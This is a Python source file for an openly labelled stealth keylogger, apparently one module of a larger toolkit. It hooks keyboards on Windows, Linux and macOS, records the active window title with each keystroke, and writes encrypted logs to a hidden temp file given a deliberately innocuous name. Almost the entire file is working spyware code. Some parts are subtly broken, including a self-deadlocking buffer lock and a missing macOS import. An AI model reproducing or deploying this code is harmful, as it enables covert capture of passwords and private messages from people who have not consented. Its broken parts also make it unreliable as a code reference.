#!/usr/bin/env python3
"""
Advanced Keylogger Implementation
Captures keystrokes with encryption and stealth features
"""

import os
import sys
import time
import threading
import queue
import platform
import json
import base64
from datetime import datetime
from typing import Optional, List, Dict, Any
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

from Core.config_loader import config
from Core.logger import get_logger

log = get_logger('keylogger')

class AdvancedKeylogger:
    """
    Cross-platform keylogger with encryption and stealth
    """
    
    def __init__(self, buffer_size: int = 100, flush_interval: int = 30):
        """
        Initialize keylogger
        
        Args:
            buffer_size: Number of keystrokes to buffer before writing
            flush_interval: Seconds between forced flushes
        """
        
        self.os_type = platform.system().lower()
        self.buffer_size = buffer_size
        self.flush_interval = flush_interval
        
        # Keystroke buffer
        self.keystroke_buffer = []
        self.buffer_lock = threading.Lock()
        
        # Encryption setup
        self.encryption_key = self._generate_key()
        self.cipher_suite = Fernet(self.encryption_key)
        
        # State
        self.running = False
        self.capture_thread = None
        self.flush_thread = None
        
        # Output
        self.log_file = self._get_log_path()
        
        log.info(f"Keylogger initialized on {self.os_type}")
    
    def _generate_key(self) -> bytes:
        """Generate encryption key from config or random"""
        
        password = config.get('crypto.key', 'default_key_123').encode()
        salt = b'keylogger_salt_v1'
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return key
    
    def _get_log_path(self) -> str:
        """Get path for keylog file"""
        
        # Use temp directory for stealth
        if self.os_type == 'windows':
            base_path = os.environ.get('TEMP', 'C:\\Windows\\Temp')
        else:
            base_path = '/tmp'
        
        # Use innocuous filename
        filename = f".system_cache_{os.getpid()}.dat"
        
        return os.path.join(base_path, filename)
    
    def start(self) -> bool:
        """
        Start keylogger
        
        Returns:
            True if started successfully
        """
        
        if self.running:
            log.warning("Keylogger already running")
            return False
        
        try:
            self.running = True
            
            # Start capture thread
            if self.os_type == 'windows':
                self.capture_thread = threading.Thread(
                    target=self._capture_windows,
                    daemon=True
                )
            elif self.os_type == 'linux':
                self.capture_thread = threading.Thread(
                    target=self._capture_linux,
                    daemon=True
                )
            elif self.os_type == 'darwin':
                self.capture_thread = threading.Thread(
                    target=self._capture_macos,
                    daemon=True
                )
            else:
                log.error(f"Unsupported OS: {self.os_type}")
                return False
            
            self.capture_thread.start()
            
            # Start flush thread
            self.flush_thread = threading.Thread(
                target=self._flush_periodically,
                daemon=True
            )
            self.flush_thread.start()
            
            log.info("Keylogger started")
            return True
            
        except Exception as e:
            log.error(f"Failed to start keylogger: {e}")
            self.running = False
            return False
    
    def stop(self):
        """Stop keylogger"""
        
        if not self.running:
            return
        
        self.running = False
        
        # Wait for threads
        if self.capture_thread:
            self.capture_thread.join(timeout=2)
        
        if self.flush_thread:
            self.flush_thread.join(timeout=2)
        
        # Final flush
        self._flush_buffer()
        
        log.info("Keylogger stopped")
    
    def _capture_windows(self):
        """Capture keystrokes on Windows"""
        
        try:
            import ctypes
            import ctypes.wintypes
            
            # Windows API constants
            WH_KEYBOARD_LL = 13
            WM_KEYDOWN = 0x0100
            WM_SYSKEYDOWN = 0x0104
            
            # Hook procedure
            def low_level_keyboard_proc(nCode, wParam, lParam):
                if nCode >= 0:
                    if wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN:
                        # Extract key info
                        kbd = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                        
                        # Get key code
                        vk_code = kbd.vkCode
                        
                        # Convert to character
                        key_char = self._vk_to_char(vk_code)
                        
                        # Add to buffer
                        self._add_keystroke(key_char)
                
                # Call next hook
                return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
            
            # Define structures
            class KBDLLHOOKSTRUCT(ctypes.Structure):
                _fields_ = [
                    ("vkCode", ctypes.wintypes.DWORD),
                    ("scanCode", ctypes.wintypes.DWORD),
                    ("flags", ctypes.wintypes.DWORD),
                    ("time", ctypes.wintypes.DWORD),
                    ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
                ]
            
            # Install hook
            HOOKPROC = ctypes.WINFUNCTYPE(
                ctypes.c_int,
                ctypes.c_int,
                ctypes.wintypes.WPARAM,
                ctypes.wintypes.LPARAM
            )
            
            hook_proc = HOOKPROC(low_level_keyboard_proc)
            
            hook = ctypes.windll.user32.SetWindowsHookExW(
                WH_KEYBOARD_LL,
                hook_proc,
                ctypes.windll.kernel32.GetModuleHandleW(None),
                0
            )
            
            if not hook:
                log.error("Failed to install Windows keyboard hook")
                return
            
            # Message loop
            msg = ctypes.wintypes.MSG()
            
            while self.running:
                bRet = ctypes.windll.user32.GetMessageW(
                    ctypes.byref(msg), None, 0, 0
                )
                
                if bRet == 0:  # WM_QUIT
                    break
                elif bRet == -1:  # Error
                    log.error("Error in message loop")
                    break
                else:
                    ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
                    ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
            
            # Unhook
            ctypes.windll.user32.UnhookWindowsHookEx(hook)
            
        except Exception as e:
            log.error(f"Windows capture failed: {e}")
    
    def _capture_linux(self):
        """Capture keystrokes on Linux"""
        
        try:
            # Try multiple methods
            
            # Method 1: /dev/input/event* (requires root)
            if os.getuid() == 0:
                self._capture_linux_evdev()
            # Method 2: X11 (requires X server)
            elif os.environ.get('DISPLAY'):
                self._capture_linux_x11()
            # Method 3: Terminal input (limited)
            else:
                self._capture_linux_terminal()
                
        except Exception as e:
            log.error(f"Linux capture failed: {e}")
    
    def _capture_linux_evdev(self):
        """Capture using evdev (requires root)"""
        
        try:
            # Find keyboard device
            keyboard_device = None
            
            for i in range(20):
                device_path = f'/dev/input/event{i}'
                if os.path.exists(device_path):
                    try:
                        # Check if it's a keyboard
                        with open(device_path, 'rb') as f:
                            # This would check device capabilities
                            keyboard_device = device_path
                            break
                    except:
                        pass
            
            if not keyboard_device:
                log.error("No keyboard device found")
                return
            
            # Open device
            with open(keyboard_device, 'rb') as device:
                log.info(f"Reading from {keyboard_device}")
                
                while self.running:
                    # Read input event (24 bytes on 64-bit)
                    data = device.read(24)
                    
                    if len(data) == 24:
                        # Parse event
                        # struct input_event {
                        #     struct timeval time;
                        #     __u16 type;
                        #     __u16 code;
                        #     __s32 value;
                        # };
                        
                        import struct
                        
                        # Unpack event
                        tv_sec, tv_usec, ev_type, code, value = struct.unpack('llHHI', data)
                        
                        # Key event
                        if ev_type == 1 and value == 1:  # EV_KEY and pressed
                            key_char = self._linux_keycode_to_char(code)
                            if key_char:
                                self._add_keystroke(key_char)
                                
        except Exception as e:
            log.error(f"evdev capture failed: {e}")
    
    def _capture_linux_x11(self):
        """Capture using X11"""
        
        try:
            # This would use python-xlib
            # Simplified for demonstration
            log.info("X11 capture not fully implemented")
            
            # Fallback to terminal
            self._capture_linux_terminal()
            
        except Exception as e:
            log.error(f"X11 capture failed: {e}")
    
    def _capture_linux_terminal(self):
        """Capture terminal input (limited)"""
        
        try:
            import termios
            import tty
            
            # Save terminal settings
            old_settings = termios.tcgetattr(sys.stdin)
            
            try:
                # Set terminal to raw mode
                tty.setraw(sys.stdin.fileno())
                
                while self.running:
                    # Read single character
                    if sys.stdin in select.select([sys.stdin], [], [], 0.1)[0]:
                        char = sys.stdin.read(1)
                        self._add_keystroke(char)
                        
            finally:
                # Restore terminal settings
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
                
        except Exception as e:
            log.error(f"Terminal capture failed: {e}")
    
    def _capture_macos(self):
        """Capture keystrokes on macOS"""
        
        try:
            # macOS requires Accessibility permissions
            # Use Quartz event tap
            
            from Quartz import (
                CGEventTapCreate,
                CGEventTapEnable,
                CGEventGetIntegerValueField,
                CGEventMaskBit,
                CFRunLoopGetCurrent,
                CFRunLoopRun,
                CFRunLoopStop,
                kCGEventKeyDown,
                kCGEventTapOptionDefault,
                kCGHIDEventTap,
                kCGKeyboardEventKeycode
            )
            
            def event_callback(proxy, event_type, event, refcon):
                if event_type == kCGEventKeyDown:
                    keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode)
                    key_char = self._macos_keycode_to_char(keycode)
                    if key_char:
                        self._add_keystroke(key_char)
                
                return event
            
            # Create event tap
            event_mask = CGEventMaskBit(kCGEventKeyDown)
            
            tap = CGEventTapCreate(
                kCGHIDEventTap,
                kCGHeadInsertEventTap,
                kCGEventTapOptionDefault,
                event_mask,
                event_callback,
                None
            )
            
            if not tap:
                log.error("Failed to create macOS event tap (needs Accessibility permissions)")
                return
            
            # Enable tap
            CGEventTapEnable(tap, True)
            
            # Run event loop
            CFRunLoopRun()
            
        except ImportError:
            log.error("Quartz module not available on macOS")
        except Exception as e:
            log.error(f"macOS capture failed: {e}")
    
    def _vk_to_char(self, vk_code: int) -> str:
        """Convert Windows virtual key code to character"""
        
        # Special keys
        special_keys = {
            0x08: '[BACKSPACE]',
            0x09: '[TAB]',
            0x0D: '[ENTER]',
            0x1B: '[ESC]',
            0x20: ' ',
            0x2E: '[DELETE]',
            0x25: '[LEFT]',
            0x26: '[UP]',
            0x27: '[RIGHT]',
            0x28: '[DOWN]',
            0x5B: '[LWIN]',
            0x5C: '[RWIN]',
            0xA0: '[LSHIFT]',
            0xA1: '[RSHIFT]',
            0xA2: '[LCTRL]',
            0xA3: '[RCTRL]',
            0xA4: '[LALT]',
            0xA5: '[RALT]',
        }
        
        if vk_code in special_keys:
            return special_keys[vk_code]
        
        # Alphanumeric
        if 0x30 <= vk_code <= 0x39:  # 0-9
            return chr(vk_code)
        
        if 0x41 <= vk_code <= 0x5A:  # A-Z
            # Check shift state
            import ctypes
            if ctypes.windll.user32.GetKeyState(0x10) & 0x8000:  # VK_SHIFT
                return chr(vk_code)
            else:
                return chr(vk_code + 32)  # lowercase
        
        # Function keys
        if 0x70 <= vk_code <= 0x7B:  # F1-F12
            return f'[F{vk_code - 0x6F}]'
        
        # Other characters
        return f'[{vk_code}]'
    
    def _linux_keycode_to_char(self, code: int) -> str:
        """Convert Linux keycode to character"""
        
        # Linux keycodes (simplified mapping)
        keycode_map = {
            1: '[ESC]',
            2: '1', 3: '2', 4: '3', 5: '4', 6: '5',
            7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
            14: '[BACKSPACE]',
            15: '[TAB]',
            16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't',
            21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p',
            28: '[ENTER]',
            29: '[LCTRL]',
            30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g',
            35: 'h', 36: 'j', 37: 'k', 38: 'l',
            42: '[LSHIFT]',
            44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b',
            49: 'n', 50: 'm',
            54: '[RSHIFT]',
            56: '[LALT]',
            57: ' ',
            100: '[RALT]',
        }
        
        return keycode_map.get(code, f'[{code}]')
    
    def _macos_keycode_to_char(self, keycode: int) -> str:
        """Convert macOS keycode to character"""
        
        # macOS keycodes (simplified)
        keycode_map = {
            0: 'a', 1: 's', 2: 'd', 3: 'f', 4: 'h',
            5: 'g', 6: 'z', 7: 'x', 8: 'c', 9: 'v',
            11: 'b', 12: 'q', 13: 'w', 14: 'e', 15: 'r',
            16: 'y', 17: 't', 18: '1', 19: '2', 20: '3',
            21: '4', 22: '6', 23: '5', 24: '=', 25: '9',
            26: '7', 27: '-', 28: '8', 29: '0', 30: ']',
            31: 'o', 32: 'u', 33: '[', 34: 'i', 35: 'p',
            36: '[ENTER]', 37: 'l', 38: 'j', 39: "'", 40: 'k',
            41: ';', 42: '\\', 43: ',', 44: '/', 45: 'n',
            46: 'm', 47: '.', 48: '[TAB]', 49: ' ', 50: '`',
            51: '[DELETE]', 53: '[ESC]',
        }
        
        return keycode_map.get(keycode, f'[{keycode}]')
    
    def _add_keystroke(self, key: str):
        """Add keystroke to buffer"""
        
        with self.buffer_lock:
            # Add timestamp and context
            keystroke_data = {
                'key': key,
                'timestamp': datetime.now().isoformat(),
                'window': self._get_active_window()
            }
            
            self.keystroke_buffer.append(keystroke_data)
            
            # Check if buffer is full
            if len(self.keystroke_buffer) >= self.buffer_size:
                self._flush_buffer()
    
    def _get_active_window(self) -> str:
        """Get active window title"""
        
        try:
            if self.os_type == 'windows':
                import ctypes
                
                # Get foreground window
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                
                # Get window title
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buffer = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buffer, length + 1)
                
                return buffer.value
            
            elif self.os_type == 'linux':
                # Use xdotool or wmctrl
                try:
                    import subprocess
                    result = subprocess.run(
                        ['xdotool', 'getactivewindow', 'getwindowname'],
                        capture_output=True,
                        text=True
                    )
                    return result.stdout.strip()
                except:
                    return "Unknown"
            
            elif self.os_type == 'darwin':
                # Use AppleScript
                try:
                    import subprocess
                    script = 'tell application "System Events" to get name of first window of (first process whose frontmost is true)'
                    result = subprocess.run(
                        ['osascript', '-e', script],
                        capture_output=True,
                        text=True
                    )
                    return result.stdout.strip()
                except:
                    return "Unknown"
            
        except:
            pass
        
        return "Unknown"
    
    def _flush_buffer(self):
        """Flush keystroke buffer to file"""
        
        with self.buffer_lock:
            if not self.keystroke_buffer:
                return
            
            try:
                # Prepare data
                data = {
                    'session_id': os.getpid(),
                    'keystrokes': self.keystroke_buffer,
                    'count': len(self.keystroke_buffer)
                }
                
                # Serialize
                json_data = json.dumps(data)
                
                # Encrypt
                encrypted_data = self.cipher_suite.encrypt(json_data.encode())
                
                # Write to file
                with open(self.log_file, 'ab') as f:
                    # Write length prefix
                    f.write(len(encrypted_data).to_bytes(4, 'little'))
                    # Write encrypted data
                    f.write(encrypted_data)
                    f.write(b'\n')
                
                log.debug(f"Flushed {len(self.keystroke_buffer)} keystrokes")
                
                # Clear buffer
                self.keystroke_buffer.clear()
                
            except Exception as e:
                log.error(f"Failed to flush buffer: {e}")
    
    def _flush_periodically(self):
        """Periodically flush buffer"""
        
        while self.running:
            time.sleep(self.flush_interval)
            self._flush_buffer()
    
    def read_logs(self) -> List[Dict[str, Any]]:
        """
        Read and decrypt logged keystrokes
        
        Returns:
            List of keystroke sessions
        """
        
        sessions = []
        
        if not os.path.exists(self.log_file):
            return sessions
        
        try:
            with open(self.log_file, 'rb') as f:
                while True:
                    # Read length
                    length_bytes = f.read(4)
                    if not length_bytes:
                        break
                    
                    length = int.from_bytes(length_bytes, 'little')
                    
                    # Read encrypted data
                    encrypted_data = f.read(length)
                    
                    # Skip newline
                    f.read(1)
                    
                    # Decrypt
                    try:
                        decrypted_data = self.cipher_suite.decrypt(encrypted_data)
                        session_data = json.loads(decrypted_data.decode())
                        sessions.append(session_data)
                    except:
                        pass
            
        except Exception as e:
            log.error(f"Failed to read logs: {e}")
        
        return sessions

# Test keylogger
if __name__ == "__main__":
    import sys
    import select
    
    sys.path.insert(0, '/workspace')
    
    print("Testing Advanced Keylogger")
    print("-" * 50)
    
    keylogger = AdvancedKeylogger(buffer_size=10, flush_interval=5)
    
    print(f"OS: {keylogger.os_type}")
    print(f"Log file: {keylogger.log_file}")
    print(f"Encryption: Enabled")
    
    # Test encryption
    test_data = "Test keystrokes"
    encrypted = keylogger.cipher_suite.encrypt(test_data.encode())
    decrypted = keylogger.cipher_suite.decrypt(encrypted).decode()
    
    if decrypted == test_data:
        print("✅ Encryption working")
    
    # Test buffer
    keylogger._add_keystroke('t')
    keylogger._add_keystroke('e')
    keylogger._add_keystroke('s')
    keylogger._add_keystroke('t')
    
    print(f"✅ Buffer has {len(keylogger.keystroke_buffer)} keystrokes")
    
    print("\n✅ Keylogger module working!")